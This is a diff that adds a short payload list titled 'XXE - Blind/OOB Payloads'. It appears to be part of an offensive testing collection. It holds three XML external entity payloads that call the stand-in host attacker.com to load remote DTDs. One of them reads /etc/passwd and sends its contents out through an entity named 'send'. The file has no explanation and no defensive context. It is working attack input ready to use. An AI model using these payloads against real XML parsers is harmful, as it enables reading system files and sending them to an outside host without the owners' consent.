@@ -1,0 +1,4 @@
+# XXE - Blind/OOB Payloads
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]><root/>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo>&send;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/"> %remote; ]><data/>
